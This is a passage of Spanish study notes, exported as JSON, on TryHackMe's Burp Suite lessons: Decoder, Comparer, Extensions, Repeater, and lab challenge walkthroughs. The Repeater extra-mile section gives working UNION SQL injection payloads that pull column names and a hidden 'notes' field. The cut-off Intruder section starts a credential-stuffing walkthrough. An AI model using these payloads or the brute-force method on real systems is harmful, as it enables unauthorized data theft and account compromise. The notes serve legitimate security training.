    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/4-burp-suite/4-burp-suite-other-modules/0-burp-suite-other-modules/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/4. Burp Suite - Other Modules/0. Burp Suite - Other Modules.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 4. Burp Suite > 4. Burp Suite - Other Modules",
    "content": "[[1. Decoder - Overview]]\n[[2. Decoder - Encoding-Decoding]]\n[[3. Decoder - Hashing]]\n[[4. Comparer - Overview]]\n[[5. Comparer - Example]]\n[[6. Sequencer - Overview]]\n[[7. Sequencer - Live Capture]]\n[[8. Sequencer - Analysis]]\n[[9. Organizer - Overview]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Decoder - Encoding-Decoding",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/4-burp-suite/4-burp-suite-other-modules/2-decoder-encoding-decoding/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/4. Burp Suite - Other Modules/2. Decoder - Encoding-Decoding.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 4. Burp Suite > 4. Burp Suite - Other Modules",
    "content": "Ahora examinaremos las opciones de encoding y decoding manual en detalle. Son id√©nticos elijas el men√∫ de encoding o decoding.\n\n![[Pasted image 20251116183157.png]]\n\n- **Plain:** Se refiere al formato crudo sin transformaciones.\n- **URL:** El URL encoding se utiliza para asegurar la transmisi√≥n de la informaci√≥n en la URL. Se basa en sustituir caracteres ASCII por formato hexadecimal precedido de un `%`.\n- **HTML:** El HTML Entities encoding reemplaza caracteres especiales con un ampersand (`&`) seguido de un n√∫mero hexadecimal o una referencia al caractrer especial siendo escapado y terminando con `;`. Asegura el renderizado seguro de caracteres especiales y previene ataques como XSS.\n- **Base64:** Un m√©todo de encoding bastante usado que convierte la informaci√≥n en un formato compatible con ASCII. [Aqu√≠](https://stackabuse.com/encoding-and-decoding-base64-strings-in-python) puedes encontrar las matem√°ticas sobre c√≥mo funciona esto.\n- **ASCII Hex:** Esta opci√≥n transiciona la informaci√≥n entre ASCII y hexadecimal.\n- **Hex, Octal y Binary:** Aplican s√≥lamente a inputs num√©ricos, convirtiendo entre decimal, hexadecimal, octal y binario.\n- **Gzip:** Comprime informaci√≥n, reduciendo el tama√±o del archivo y la p√°gina antes de su transmisi√≥n.\n\nEstos m√©todos pueden ser combinados:\n\n![[Pasted image 20251116183332.png]]\n\n---------------------------------\n<h2>Formato Hex</h2>\nMientras que introducir informaci√≥n en formato ASCII es beneficioso, hay momentos en los que el editar byte a byte es necesario. Aqu√≠ es donde \"Hex View\" entra en juego.\n\n![[Pasted image 20251116184326.png]]\n\nEsta funcionalidad nos permite ver y alterar la informaci√≥n en formato hexadecimal.\n\n--------------------------------\n<h2>Smart Decode</h2>\nPor √∫ltimo tenemos la opci√≥n de **Smartt Decode**. Esta funcionalidad intenta auto-decodear el texto encodeado. Por ejemplo, `&#x42;&#x75;&#x72;&#x70;&#x20;&#x53;&#x75;&#x69;&#x74;&#x65;` se reconoce autom√°ticamente como HTML y se decodea as√≠.\n\n![[Pasted image 20251116184459.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Comparer - Overview",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/4-burp-suite/4-burp-suite-other-modules/4-comparer-overview/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/4. Burp Suite - Other Modules/4. Comparer - Overview.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 4. Burp Suite > 4. Burp Suite - Other Modules",
    "content": "El Comparer, como su nombre implica, nos permite comparar dos piezas de informaci√≥n, ya sea por palabras ASCII o bytes.\n\nVeamos la interfaz:\n\n![[Pasted image 20251116211727.png]]\n\nLa interfaz puede ser dividida en tres secciones principales.\n\n1. A la izquierda vemos los √≠tems para ser comparados. Cuando cargamos la informaci√≥n en el Comparer, aparece como filas en las tablas.Seleccionamos dos para compararlos.\n2. En la parte superior derecha tenemos opciones para pegar informaci√≥n del clipboard, cargarlo de un archivo, eliminar la fila actual, y limpiar todos los datasets.\n3. Por √∫ltimo en la parte inferior derecha, podemos elegir entre compararlos por palabras o por bytes. Da igual lo que selecciones al principio porque se puede cambiar m√°s adelante.\n\nTambi√©n puedes cargar informaci√≥n en √©l desde otros m√≥dulos haciendo click derecho y \"**Send to Comparer**\".\n\nUna vez a√±adidos al menos 2 datasets y le demos a **words** o **bytes** salta una ventana que se ve as√≠:\n\n![[Pasted image 20251116212840.png]]\n\nEsta ventana tambi√©n tiene 3 secciones.\n\n1. La informaci√≥n comparada ocupa la mayor parte de la ventana. Se puede ver en texto o en hex.\n2. Abajo a la izquierda est√° la llave de comparaci√≥n que muestra lo que representan los colores.\n3. La caja de \"**Sync views**\", abajo a la derecha, hace que cuando la seleccionamos, se asegura de que los datasets tengan el mismo formato.\n\nEl t√≠tulo de la pesta√±a muestra el n√∫mero total de diferencias encontradas.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. The BApp Store",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/4-burp-suite/5-burp-suite-extensions/2-the-bapp-store/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/5. Burp Suite - Extensions/2. The BApp Store.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 4. Burp Suite > 5. Burp Suite - Extensions",
    "content": "En Burp Suite, la BApp Store (Burp App Store) nos permite descubrir e integrar f√°cilmente extensiones oficiales en la herramienta. Las extensiones pueden ser escritas en varios lenguajes siendo Java y Python los m√°s comunes. Las extensiones de Java se integran autom√°ticamente con el framework de Burp Suite, mientras que aquellas hechas en pyhton requieren del interpretador Jython.\n\nPara ver c√≥mo se hace vamos a instalar una extensi√≥n de Java, el [Request Timer](https://github.com/portswigger/request-timer), desarrollada por Nick Taylor. La extensi√≥n Request Timer nos permite registrar el tiempo que toma a cada petici√≥n recibir la respuesta. Muy √∫til para descubrir e investigar vulnerabilidades basadas en tiempo (como Time-Based SQLi).\n\n1. Ve a la subpesta√±a **BApp Store** en la pesta√±a Extensions en Burp Suite.\n2. Usamos la funci√≥n de b√∫squeda para encontrar **Request Timer**. S√≥lo deber√≠a de haber un resultado para esta extensi√≥n.\n3. Hacemos click en la extensi√≥n devuelta para ver m√°s detalles.\n4. Le damos a **Install** para instalar la extensi√≥n.\n\n![[Pasted image 20251117095939.png]]\n\nDespu√©s de instalarla exitosamente, veremos que aparece una nueva pesta√±a en el men√∫ principal arriba. Las extensiones pueden tener comportamientos diferentes.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Jython",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/4-burp-suite/5-burp-suite-extensions/3-jython/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/5. Burp Suite - Extensions/3. Jython.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 4. Burp Suite > 5. Burp Suite - Extensions",
    "content": "Para usar m√≥dulos de Python en Burp Suite, necesitas integrar el archivo JAR del interpretador Jython, que es una implementaci√≥n de Java en Python.\n\nSigue los siguienntes pasos para integrarlo:\n\n1. **Descarga Jython JAR:** Visita la p√°gina de [Jython](https://www.jython.org/download) y descarga el archivo JAR. Busca la opci√≥n **Jython Standalone**. Guarda el archivo JAR en una ruta conocida en tu disco.\n   ![[Pasted image 20251117102353.png]]\n2. **Configura Jython en Burp Suite:** Abre Burp Suite y cambia al m√≥dulo Extensions. Luego ve a Extension Settings.\n3. **Entorno Python:** Baja hasta la secci√≥n de \"Python environment\".\n4. **Configura la Ruta del Jython JAR:** En el campo \"Location of Jython standalone JAR file\", configura la ruta de tu archivo JAR.\n   ![[Pasted image 20251117102358.png]]\n\nUna vez hecho esto, Jython quedar√° integrado en tu Burp Suite permiti√©ndote usar m√≥dulos de Python en la herramienta.\n\n>[!TIP] Se hace igual en todos los sistemas operativos porque Java es una tecnolog√≠a multiplataforma.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. The Burp Suite API",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/4-burp-suite/5-burp-suite-extensions/4-the-burp-suite-api/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/5. Burp Suite - Extensions/4. The Burp Suite API.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 4. Burp Suite > 5. Burp Suite - Extensions",
    "content": "En el m√≥dulo Extensions, tienes acceso a un amplio rango de endpoints API que te permiten crear e integrar tus propios m√≥dulos de Burp Suite. Estas APIs exponen varias funcionalidades, permiti√©ndote extender las capacidades de Burp Suite seg√∫n tus necesidades.\n\nPara ver los endpoints API disponibles, navega a la subpesta√±a de APIs en el m√≥dulo Extensions. Cata √≠tem listado en la parte de la izquierda representa un endpoint API que puede ser accedido desde las extensiones.\n\n![[Pasted image 20251117104534.png]]\n\nLas APIs de Extensions le da a los desarrolladores flexibilidad y poder al escribir extensiones. Burp Suite soporta varios lenguajes para escribir extensiones como:\n\n- Java (nativo).\n- Python (v√≠a Jython).\n- Ruby (v√≠a JRuby).\n\nPara aprender m√°s sobre la escritura de extensiones visita la [documentaci√≥n oficial de PortSwigger](https://portswigger.net/burp/extender/writing-your-first-burp-suite-extension).",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. The Extensions Interface",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/4-burp-suite/5-burp-suite-extensions/1-the-extensions-interface/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/5. Burp Suite - Extensions/1. The Extensions Interface.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 4. Burp Suite > 5. Burp Suite - Extensions",
    "content": "La interfaz de extensiones en Burp Suite ofrece una vista de las extensiones cargada en la herramienta. Echemos un vistazo a los diferentes componentes.\n\n![[Pasted image 20251117092220.png]]\n\n1. **Extensions List:** La caja de arriba muestra una lista de las extensiones instaladas actualmente para el proyecto actual. Permite activar o desactiver extensiones.\n2. **Managing Extensions:** En la parte izquierda de la interfaz, hay opciones para manejar extensiones:\n\t- **Add:** Puedes usar este bot√≥n para instalar nuevas extensiones de archivos en tu disco. Pueden ser programados por ti u obtenidos de las fuentes externas.\n\t- **Remove:** Este bot√≥n permite desinstalar extensiones.\n\t- **Up/Down:** Estos botones controlan el orden en el que se listan las extensiones instaladas. Es importante porque las extensiones se aplican de arriba a abajo y el orden importa.\n3. **Details, Output and Errors:** Hacia la parte inferior de la ventana hay secciones para la extensi√≥n seleccionada actualmente:\n\t- **Details:** Esta secci√≥n ofrece informaci√≥n sobre la extensi√≥n seleccionada, como el nombre, versi√≥n y descripci√≥n.\n\t- **Output:** Las extensiones pueden producir un output durante su ejecuci√≥n, y esta secci√≥n muestra cualquier output o resultados relevantes.\n\t- **Errors:** Si una extensi√≥n se encuentra alg√∫n error durante su ejecuci√≥n, ser√°n mostradas aqu√≠.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Burp Suite - Extensions",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/4-burp-suite/5-burp-suite-extensions/0-burp-suite-extensions/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/5. Burp Suite - Extensions/0. Burp Suite - Extensions.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 4. Burp Suite > 5. Burp Suite - Extensions",
    "content": "[[1. The Extensions Interface]]\n[[2. The BApp Store]]\n[[3. Jython]]\n[[4. The Burp Suite API]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Burp Suite - Repeater",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/4-burp-suite/2-burp-suite-repeater/0-burp-suite-repeater/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/2. Burp Suite - Repeater/0. Burp Suite - Repeater.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 4. Burp Suite > 2. Burp Suite - Repeater",
    "content": "[[1. What is Repeater]]\n[[2. Basic Usage]]\n[[3. Message Analysis Toolbar]]\n[[4. Inspector]]\n[[5. Practical Example]]\n[[6. Challenge]]\n[[7. Extra-mile Challenge]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Practical Example",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/4-burp-suite/2-burp-suite-repeater/5-practical-example/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/2. Burp Suite - Repeater/5. Practical Example.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 4. Burp Suite > 2. Burp Suite - Repeater",
    "content": "El repetidor est√° particularmente bien equipado para tareas repetitivas de peticiones similares, t√≠picamente con modificaciones menores. Esto es particularmente √∫til para actividades como el testeo manual de SQLi, intentar sobrepasar los filtros del firewall o ajustar par√°metros en un formulario.\n\nComencemos por una actividad sencilla, manipular los headers que una aplicaci√≥n manda a un servidor. Abre Burp Suite, captura una petici√≥n y a√±√°dele un header nuevo llamado `FlagAuthorised` y config√∫rala en `True`.\n\n------------------------\n<h2>Challenge</h2>\n1. Abrimos Burp Suite.\n   ![[Pasted image 20251114202144.png]]\n2. Nos dirigimos a proxy, abrimos el navegador, le damos a interceptar y vamos a la p√°gina dada.\n   ![[Pasted image 20251114202312.png]]\n3. La mandamos al repetidor.\n   ![[Pasted image 20251114202343.png]]\n4. A√±adimos el header que nos piden.\n   ![[Pasted image 20251114202536.png]]\n5. Vemos la petici√≥n y le damos a mandar.\n   ![[Pasted image 20251114202615.png]]\n6. Observamos que la respuesta contiene la flag.\n   ![[Pasted image 20251114202642.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Inspector",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/4-burp-suite/2-burp-suite-repeater/4-inspector/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/2. Burp Suite - Repeater/4. Inspector.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 4. Burp Suite > 2. Burp Suite - Repeater",
    "content": "El Inspector es una funcionalidad complementaria para la vista de peticiones y respuestas. Tambi√©n se usa para obtener un desglose organizado visualmente de las peticiones y respuestas, as√≠ como para experimentar para ver c√≥mo los cambios hechos usando el Inspector de alto nivel afectan a las respectivas versiones raw.\n\nEl inspector puede utilizarse en los m√≥dulos proxy y repetidor. En ambos est√° situado a la derecha de la ventana, presentando una lista de componentes de petici√≥n y respuesta.\n\n![[Pasted image 20251114181114.png]]\n\nEntre estos componentes, las secciones pertenecientes a la petici√≥n pueden ser modificadas activando la adici√≥n, edici√≥n y eliminaci√≥n de √≠tems. Por ejemplo en la secci√≥n de **Request Attributes**, podemos alterar elementos relacionados con la localizaci√≥n, m√©todo y protocolo de la petici√≥n. Esto incluye modificar el recurso a recuperar, cambiar el m√©todo de `GET` a otro o cambiar entre protocolos de HTTP/1 a HTTP/2, por ejemplo.\n\n![[Pasted image 20251114181519.png]]\n\nOtras secciones disponibles para ver o editar incluyen:\n\n1. **Request Query Parameters:** Estos se refieren a la informaci√≥n mandada a trav√©s de la URL en forma de par√°metros, como `https://admin.tryhackme.com/?redirect=false`. El par√°metro query es **redirect**.\n2. **Request Body Parameters:** Similar a los par√°metros query, pero espec√≠fico de las peticiones POST. Cualquier informaci√≥n mandada como parte de una petici√≥n POST ser√° mostrada en esta secci√≥n, permiti√©ndonos modificar los par√°metros antes de mandarlos.\n3. **Request Cookies:** Esta secci√≥n contiene una lista modificable de cookies mandadas con cada petici√≥n.\n4. **Request Headers:** Nos permite ver, acceder y modificar (incluyendo a√±adir o eliminar) cualquier header mandado con las peticiones. Editar estos headers puede ser valioso cuando examinamos c√≥mo responde in servidor web a headers inesperados.\n5. **Response Headers:** Esta secci√≥n muestra los headers devueltos por el servidor en respuesta a nuestra petici√≥n. No puede ser modificado, ya que no tenemos control sobre los headers mandados por el servidor.\n\nMientras que la representaci√≥n textual de estos componentes puede encontrarse en las vistas de petici√≥n y respuesta, el formato tabular del Inspector nos ofrece una manera conveniente de visualizar e interactuar con ellos.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. What is Repeater",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/4-burp-suite/2-burp-suite-repeater/1-what-is-repeater/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/2. Burp Suite - Repeater/1. What is Repeater.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 4. Burp Suite > 2. Burp Suite - Repeater",
    "content": "Antes de usar el repetidor de Burp Suite, familiaric√©monos con su prop√≥sito y funcionalidades.\n\nEn esencia, el repetidor de Burp Suite nos permite modificar y remandar peticiones interceptadas a un objetivo de nuestra elecci√≥n. Nos permite tomar peticiones capturadas en el proxy de Burp Suite y manipularlas, mandarlas repetidamente, etc. De forma alternativa, podemos crear peticiones manualmente desde 0, similar a usar una herramienta de l√≠nea de comandos como cURL.\n\nLa habilidad de editar y remandar peticiones varias veces hace que el repetidor sea de valor incalculable para la exploraci√≥n y testeo de endpoints. Ofrece una interfaz gr√°fica de usuario para montar peticiones de payloads y ofrece varias vistas de la respuesta, incluyendo un motor de renderizado para una representaci√≥n gr√°fica.\n\nLa interfaz del repetidor consiste en seis secciones principales, como se ve en la imagen de abajo.\n\n![[Pasted image 20251114154529.png]]\n\n1. **Lista de Peticiones:** Situado en la parte superior izquierda de la pesta√±a, muestra la lista de peticiones del repetidor. Se pueden gestionar varias peticiones a la vez y cada nueva petici√≥n que se mande al repetidor aparecer√° aqu√≠.\n2. **Controles de Petici√≥n:** Posicionado directamente debajo de la lista de peticiones, estos controles nos permiten mandar peticiones, cancelar peticiones pendientes y navegar por el historial de peticiones.\n3. **Vista de Peticiones y Respuestas:** Ocupando la mayor√≠a de la interfaz, esta secci√≥n muestra las peticiones y respuestas detalladamente. Podemos editar las peticiones en ella y luego mandarlas mientras que la correspondiente respuesta se mostrar√° en su respectiva parte.\n4. **Opciones de Visualizaci√≥n:** Situado en la parte superior derecha, estas opciones nos permiten personalizar la visualizaci√≥n del apartado anterior.\n5. **Inspector:** Situado en la parte derecha, el inspector nos permite analizar y modificar peticiones de una manera m√°s intuitiva que usando el visor raw. Exploraremos esta funcionalidad m√°s adelante.\n6. **Target:** Situado por encima del inspector, el campo target especifica la IP o dominio al que las peticiones son mandadas. Cuando las peticiones se mandan al repetidor desde otros componentes de Burp Suite este campo se rellena autom√°ticamente.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Message Analysis Toolbar",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/4-burp-suite/2-burp-suite-repeater/3-message-analysis-toolbar/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/2. Burp Suite - Repeater/3. Message Analysis Toolbar.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 4. Burp Suite > 2. Burp Suite - Repeater",
    "content": "El repetidor nos ofrece varias opciones de presentaci√≥n de petici√≥n y respuesta, desde hexadecimal a p√°gina renderizada.\n\nPara explorar estas opciones, podemos ir a la secci√≥n situada encima de la caja de respuesta, donde podemos ver los siguientes botones:\n\n![[Pasted image 20251114165239.png]]\n\nSe nos presentan 4 opciones:\n\n1. **Pretty:** Esta es la opci√≥n por defecto, que toma la respuesta raw y le aplica mejoras leves de formato para mejorar su legibilidad.\n2. **Raw:** Esta opci√≥n muestra la respuesta tal cual es recibida desde el servidor.\n3. **Hex:** Al seleccionar esta opci√≥n, podemos examinar la respuesta en un nivel de byte que es particularmente √∫til al lidiar con archivos binarios.\n4. **Render:** La opci√≥n de renderizado nos permite visualizar la p√°gina como aparecer√≠a en un navegador web.\n\nJunto a estos botones, en la parte derecha, podemos encontrar la opci√≥n de **Mostrar los Caracteres no Imprimibles**, en el bot√≥n `\\n`. Esta funcionalidad activa la vista de caracteres que puede que no sean visibles con las opciones **Pretty** o **Raw**. Por ejemplo, cada l√≠nea en la respuesta normalmente acaba con los caracteres `\\r\\n`. Estos caracteres juegan un papel importante en la interpretaci√≥n de headers HTTP.\n\n>[!TIP] Aunque no es obligatorio para todas las tareas, esta opci√≥n puede ser muy √∫til en ciertas situaciones.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "7. Extra-mile Challenge",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/4-burp-suite/2-burp-suite-repeater/7-extra-mile-challenge/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/2. Burp Suite - Repeater/7. Extra-mile Challenge.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 4. Burp Suite > 2. Burp Suite - Repeater",
    "content": "Esta tarea est√° dise√±ada para poner a prueba tus capacidades en un escenario m√°s desafiante y realista utilizando Burp Suite. El objetivo del reto es identificar y explotar una vulnerabilidad SQLi de UNION presente en el par√°metro ID del endpoint `/about/ID`. Explotando dicha vulnerabilidad debes conseguir las notas sobre el CEO guardadas en la base de datos.\n\n¬°A por ello!\n\n---------------------------------------\n<h2>Challenge</h2>\n1. Vamos a la p√°gina dada.\n   ![[Pasted image 20251114211231.png]]\n2. Seleccionamos una persona.\n   ![[Pasted image 20251114211256.png]]\n3. Hemos llegado al endpoint del que se nos hablaba al principio por lo que vamos a activar la intercepci√≥n de Burp Suite y a ver qu√© obtenemos.\n   ![[Pasted image 20251114211353.png]]\n4. Una vez aqu√≠, ya que sabemos que se trata de una vulnerabilidad SQLi de tipo UNION vamos al l√≠o. Primero buscamos romper la query, con algo tan simple como una comilla simple `'`.\n   ![[Pasted image 20251114211729.png]]\n5. Si investigamos la respuesta del servidor observamos algo muy interesante. Nos est√°n dando la query que hemos intentado ejecutar.\n   ![[Pasted image 20251114211817.png]]\n   De aqu√≠ extraemos informaci√≥n muy valiosa:\n   - La tabla que contiene los datos se llama `people`.\n   - La query solicita cinco campos:\n\t   - `firstName` \n\t   - `lastName`\n\t   - `pfpLink`\n\t   - `role`\n\t   - `bio`\n   Es bastante f√°cil interpretar d√≥nde se coloca cada uno lo que nos ser√° muy √∫til a la hora de modificar los statements despu√©s para obtener datos.\n6. Como sabemos que el ID=0 no existe vamos a usarlo para generar un error.\n   ![[Pasted image 20251114212303.png]]\n7. Como se puede ver, eran correcto el n√∫mero de columnas. Ahora vamos a usar nuestros conocimientos en SQLi para obtener los nombres de todas las columnas. Con la siguiente query: `0 UNION SELECT group_concay(column_name),null,null,null,null FROM information_schema.columns WHERE table_name='people';-- -`\n   ![[Pasted image 20251114212641.png]]\n8. Ah√≠ podemos ver que hay una columna llamada `notes`. Vamos a extraer su contenido. Para ello utilizaremos la query: `0 UNION ALL SELECT notes,null,null,null,null FROM people WHERE id='1';-- -`\n   ![[Pasted image 20251114212912.png]]\n   As√≠ conseguimos la flag.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Challenge",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/4-burp-suite/2-burp-suite-repeater/6-challenge/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/2. Burp Suite - Repeater/6. Challenge.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 4. Burp Suite > 2. Burp Suite - Repeater",
    "content": "En el reto anterior hemos demostrado nuestro manejo del repetidor a√±adiendo un header a la petici√≥n. Ahora es momento del reto de verdad.\n\n------------------------------\n1. Navegamos a la p√°gina dada.\n   ![[Pasted image 20251114205004.png]]\n2. Observamos que los links nos redirigen a endpoints num√©ricos.\n   ![[Pasted image 20251114205035.png]]\n3. Vemos que 5 es el √∫ltimo endpoint v√°lido, m√°s altos dan error 404 not found.\n   ![[Pasted image 20251114205114.png]]\n4. El objetivo es conseguir un error 500 internal server error.\n\t1. Probamos con un n√∫mero muy grande.\n\t   ![[Pasted image 20251114205313.png]]\n\t   \n\t   Parece que no acaba en error 500.\n\t2. Probaremos con un n√∫mero m√°s peque√±o.\n\t   ![[Pasted image 20251114205405.png]]\n\t   \n\t   Parece ser que tampoco resulta en error 500.\n\t3. Probaremos con una letra.\n\t   ![[Pasted image 20251114205519.png]]\n\t4. Tampoco pasa nada as√≠ que probaremos con un car√°cter especial.\n\t   ![[Pasted image 20251114205619.png]]\n\t5. Tampoco funciona, puede que est√© validando n√∫meros enteros, probemos a meter un n√∫mero negativo.\n\t   ![[Pasted image 20251114205722.png]]\n\t   ¬°BINGO!\n5. Obtenemos la flag.\n   ![[Pasted image 20251114205823.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Basic Usage",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/4-burp-suite/2-burp-suite-repeater/2-basic-usage/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/2. Burp Suite - Repeater/2. Basic Usage.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 4. Burp Suite > 2. Burp Suite - Repeater",
    "content": "Ahora que sabemos c√≥mo se ve la interfaz, ¬øc√≥mo la usamos eficientemente? Aunque la composici√≥n manual de peticiones es una opci√≥n, es m√°s com√∫n capturar una petici√≥n y modificarla.\n\nUna vez que se ha capturado la petici√≥n deseada la podemos mandar al repetidor haciendo `Ctrl + R` o click derecho sobre ella y `Redirigir al Repetidor`. Volviendo al repetidor, podemos ver que ahora la petici√≥n se puede ver en √©l.\n\n![[Pasted image 20251114163722.png]]\n\nAmbas secciones, Target e Inspector muestran ahora informaci√≥n relevante, aunque carecemos de respuesta. Para mostrarla le damos al bot√≥n de mandar, **Send**.\n\n![[Pasted image 20251114164058.png]]\n\nSi queremos modificar cualquier aspecto de la petici√≥n, s√≥lo tenemos que escribir en ella y darle a mandar de nuevo. El cambio en la respuesta se ver√° reflejado, por ejemplo si en esta cambiamos close por open:\n\n![[Pasted image 20251114164306.png]]\n\nAdem√°s, podemos usar los botones de historial situados a la derecha del bot√≥n de mandar para navegar por el historial de modificaciones, permiti√©ndonos ir y volver entre unas y otras.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "11. Extra-mile Challenge",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/4-burp-suite/3-burp-suite-intruder/11-extra-mile-challenge/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/4. Burp Suite/3. Burp Suite - Intruder/11. Extra-mile Challenge.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 4. Burp Suite > 3. Burp Suite - Intruder",
    "content": "En este ejercicio, afrontaremos una variante un poco m√°s dif√≠cil del ataque de credential-stuffing llevado a cabo antes. Sin embargo, esta vez se han implementado nuevas medidas para hacer la fuerza bruta m√°s complicada.\n\n-----------------------------------\n<h2>Capturar la Petici√≥n</h2>\nEmpezaremos capturando la petici√≥n de `http://10.10.101.156/admin/login/` y la revisaremos. Aqu√≠ un ejemplo:\n\n```python\nHTTP/1.1 200 OK\nServer: nginx/1.18.0 (Ubuntu)\nDate: Fri, 20 Aug 2021 22:31:16 GMT\nContent-Type: text/html; charset=utf-8\nConnection: close\nSet-Cookie: session=eyJ0b2tlbklEIjoiMzUyNTQ5ZjgxZDRhOTM5YjVlMTNlMjIzNmI0ZDlkOGEifQ.YSA-mQ.ZaKKsUnNsIb47sjlyux_LN8Qst0; HttpOnly; Path=/\nVary: Cookie\nFront-End-Https: on\nContent-Length: 3922\n---\n<form method=\"POST\">\n    <div class=\"form-floating mb-3\">\n        <input class=\"form-control\" type=\"text\" name=username  placeholder=\"Username\" required>\n        <label for=\"username\">Username</label>\n    </div>\n    <div class=\"form-floating mb-3\">\n        <input class=\"form-control\" type=\"password\" name=password  placeholder=\"Password\" required>\n        <label for=\"password\">Password</label>\n    </div>\n    <input type=\"hidden\" name=\"loginToken\" value=\"84c6358bbf1bd8000b6b63ab1bd77c5e\">\n    <div class=\"d-grid\"><button class=\"btn btn-warning btn-lg\" type=\"submit\">Login!</button></div>\n</form>\n```\n\nEn esta respuesta podemos notar que junto a los campos de nombre de usuario y contrase√±a, hay ahora un set de cookies, un CSRF (Cross-Site Request Forgery) token en forma de campo oculto. Recargar la p√°gina revela que la cookie de sesi√≥n y el loginToken cambian en cada petici√≥n. Esto significa que por cada intento de login, necesitamos extraer valores v√°lidos de la cookie de sesi√≥n y el loginToken, reemplaz√°ndolos en cada petici√≥n de 